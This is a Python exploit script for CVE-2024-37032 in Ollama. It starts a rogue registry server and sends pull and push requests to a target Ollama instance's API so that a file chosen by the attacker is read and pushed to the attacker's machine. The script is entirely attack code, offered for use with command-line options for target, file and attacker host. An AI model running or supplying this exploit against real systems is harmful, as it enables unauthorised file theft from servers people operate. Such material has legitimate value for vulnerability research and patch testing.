import threading
from time import sleep
import requests
import uvicorn
import argparse
from server import create_app
import socket

SLEEP_TIME = 0.5

def get_machine_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def run_server(file, host, namespace):
    app = create_app(file, host, namespace)
    uvicorn.run(app, host='0.0.0.0', port=80)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run FastAPI rogue server and exploit script (CVE-2024-37032).")
    parser.add_argument("--file", type=str, required=True, help="The file to read remotely.")
    parser.add_argument("--target", type=str, required=True, help="The target vulnerably Ollama instance's IP.")
    parser.add_argument("--target-ip", type=str, required=False, default=11434, help="The target vulnerably Ollama instance's port.")
    parser.add_argument("--host", type=str, required=False, help="Current (attacker) machine's IP.")
    parser.add_argument("--namespace", type=str, required=False, default='vsociety/test', help="The string for the rogue registry namespace.")
    args = parser.parse_args()

    host = args.host or get_machine_ip()
    target_url = f"http://{args.target}:{args.target_ip}"
    file = args.file.lstrip("/")

    # Start the server in a new thread
    server_thread = threading.Thread(target=run_server, args=(file, host, args.namespace))
    server_thread.daemon = True
    server_thread.start()

    # Give the server a moment to start
    sleep(SLEEP_TIME)

    vuln_registry_url = f"{host}/{args.namespace}"
    pull_url = f"{target_url}/api/pull"
    push_url = f"{target_url}/api/push"

    # Now proceed with the requests
    requests.post(pull_url, json={"name": vuln_registry_url, "insecure": True})
    sleep(SLEEP_TIME)
    requests.post(push_url, json={"name": vuln_registry_url, "insecure": True})

    # Join the server thread if you want to wait for the server to finish (optional)
    server_thread.join()
